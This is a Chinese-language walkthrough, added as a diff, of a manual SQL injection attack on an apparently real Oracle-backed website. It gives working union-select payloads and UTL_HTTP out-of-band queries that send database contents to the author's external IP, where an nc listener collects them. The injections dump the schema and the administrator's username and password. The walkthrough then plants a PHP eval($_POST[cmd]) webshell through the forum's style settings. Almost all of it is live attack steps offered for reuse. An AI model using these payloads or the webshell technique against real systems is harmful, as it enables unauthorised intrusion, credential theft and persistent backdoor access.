@@ -1,0 +1,188 @@
+
+手注oracle技术
+
+《oracle注入实战之渗透联通》
+
+就是用union select语句爆全部的表的时候，根本爆不出来，最多也就能爆出几个来，那该怎么继续呢？
+
+这里就用到了我们的UTL_HTTP反弹注射。
+
+判断注入点
+
+手工判断注入点估计大家都会了，
+
+通过返回的信息“java.sql.SQLException: ORA-01756”初步判断为oracle的数据库。
+
+判断数据库类型
+
+在url后面添加“/*”，返回错误页面，排除了mysql数据库的可能
+
+在url后面添加“--”显示正常页面，说明数据库可能为mssql或者oracle
+
+为了进一步验证为oracle数据库，在url后添加  and (select count (*) from user_tables)>0--显示正常页面，
+
+说明为oracle的数据库。     注：user_tables是oracle数据库特有的表
+
+猜解字段
+
+order by 7--返回正确页面
+
+order by 8—返回了错误页面，当前表存在7个字段
+
+测试字段类型
+
+提交：union select null,null,null,null,null,null,null from dual返回正常页面。
+
+证实了字段的确为七个
+
+那接下来做的就是判断字段的类型了，因为字符型的字段位置处才能插入我们要查询的一些内容
+
+笔者依次测试提交：
+
+union select 'null',null,null,null,null,null,null from dual
+
+union select null,'null',null,null,null,null,null from dual
+
+union select null,null,'null',null,null,null,null from dual
+
+union select null,null,null,'null',null,null,null from dual
+
+……
+
+这样依次提交，当测试完七个字段的时候，笔者发现1，3，4，6，7位置处为字符型。
+
+提交：and 1=2 union select '1',2,'3','4',5,'6','7' from dual
+
+Oracle数据库的版本，提交：
+
+and 1=2 union select (select banner from sys.v_$version where rownum=1),2,'3','4',5,'6','7' from dual，
+
+显示为oracle 10g
+
+并且判断出了当前连接用户为TOTO，
+
+提交语句：
+
+and 1=2 union select (select SYS_CONTEXT ('USERENV', 'CURRENT_USER') from dual),2,'3','4',5,'6','7' from dual
+
+爆表的时候笔者就遇到了麻烦，就是当提交：
+
+and 1=2 union select TABLE_NAME,2,'3','4',5,'6','7' from USER_TABLES 时，
+
+本来是想爆出所有的用户表，可能由于表比较多，而页面处用于显示的长度不够导致部分表显示出来，
+
+下面就要用到UTL_HTTP反弹注射。
+
+UTL_HTTP反弹注射之旅
+
+要判断一下UTL_HTTP包是否存在
+
+构造语句: 
+
+and (select count(*) from all_objects where object_name='UTL_HTTP')>0--
+
+返回成功，可以利用。
+
+首先本机用NC监听某个未利用的端口3300.
+
+url处提交：
+
+and UTL_HTTP.request('http://60.2x.64.24:3300/'||(select banner from sys.v_$version where rownum=1))=1--
+
+60.2x.64.24的自己外网IP地址
+
+这样在本地就监听到了来自oracle机器的数据。并显示了oracle的数据库版本
+
+这里需要提醒大家的是每在url提交一次请求，nc监听完之后会断开，需要重新启动nc监听。
+
+接下来要做的就是常规的体力活了。暴库，暴表，暴字段
+
+①首先是暴库，提交：
+
+and UTL_HTTP.request('http://60.2x.64.24:3300/'||(select owner from all_tables where rownum=1))=1--
+
+这里返回了第一个库SYS.
+
+继续提交：
+
+and UTL_HTTP.request('http://60.2x.64.24:3300/'||(select owner from all_tables where owner<>'SYS' and rownum=1))=1--
+
+即查询库名不等于SYS的库。
+
+成功返回第二个库OUTLN
+
+笔者又依次提交
+
+and UTL_HTTP.request('http://60.2x.64.24:3300/'||(select owner from all_tables where owner<>'SYS' and owner<>'OUTLN' and rownum=1))=1--
+
+
+and UTL_HTTP.request('http://60.2x.64.24:3300/'||(select owner from all_tables where owner<>'SYS' and owner<>'OUTLN' and owner <>'SYSTEM' and rownum=1))=1--
+
+
+and UTL_HTTP.request('http://60.2x.64.24:3300/'||(select owner from all_tables where owner<>'SYS' and owner<>'OUTLN' and owner <>'SYSTEM' and owner <>'TSMSYS' and rownum=1))=1—
+
+……
+
+这样依次论推，知道最后NC的“GET /”后面没有了数据，库就暴完了。
+
+经笔者测试这里的数据库为TOTO 
+
+②然后是爆表
+
+提交：
+
+and UTL_HTTP.request('http://60.2x.64.24:3300/'||(select TABLE_NAME from all_tables where owner='TOTO' and rownum=1))=1--
+
+爆出第一张表ACCOUNTS
+
+提交：
+
+and UTL_HTTP.request('http://60.2x.64.24:3300/'||(select TABLE_NAME from all_tables where owner='TOTO' and TABLE_NAME<>'ACCOUNTS' and rownum=1))=1--
+
+获得了第二章表 A_USER。
+
+又依次提交
+
+and UTL_HTTP.request('http://60.2x.64.24:3300/'||(select TABLE_NAME from all_tables where owner='TOTO' and TABLE_NAME<>'ACCOUNTS'  and TABLE_NAME<>'A_USER' and rownum=1))=1--
+
+and UTL_HTTP.request('http://60.2x.64.24:3300/'||(select TABLE_NAME from all_tables where owner='TOTO' and TABLE_NAME<>'ACCOUNTS'  and TABLE_NAME<>'A_USER' and TABLE_NAME<>'CITY' and rownum=1))=1--
+
+……
+
+这样又爆出了表名：USERMG
+
+爆列名
+
+提交：
+
+and UTL_HTTP.request('http://60.2x.64.24:3300/'||(select COLUMN_NAME from COLS where table_name='USERMG' and rownum=1))=1--
+
+这样就获得了第一个字段名
+
+接着构造注入语句
+
+and UTL_HTTP.request('http://60.211.64.24:3300/'||(select COLUMN_NAME from COLS where table_name='USERMG' and rownum=1))=1--
+
+顺利得到第二个字段USER_PASS
+
+经过测试，字段值确实为这两个
+
+既然我们表名，列名都有了，那就来构造语句获得具体的值
+
+提交：
+
+and 1=2 union select USER_NAME,2,USER_PASS,'4',5,'6','7' from USERMG
+
+即可以获得了系统管理员的账号密码
+
+登录。进取shell.
+
+发现只有登录后基本没有利用的地方，唯独论坛是个突破口。
+
+恰巧系统管理的密码和注出的密码相同。成功登陆
+
+论坛管理  -  界面风格   -  默认风格  -  详情  - 新增变量 
+
+变量内容为 ', '#999');eval($_POST[cmd]);// 替换内容随便写，
+
+提交之后用一句话木马连接论坛这个页面/forumdata/cache/style_1.php 密码为cmd,获得一句话小马。
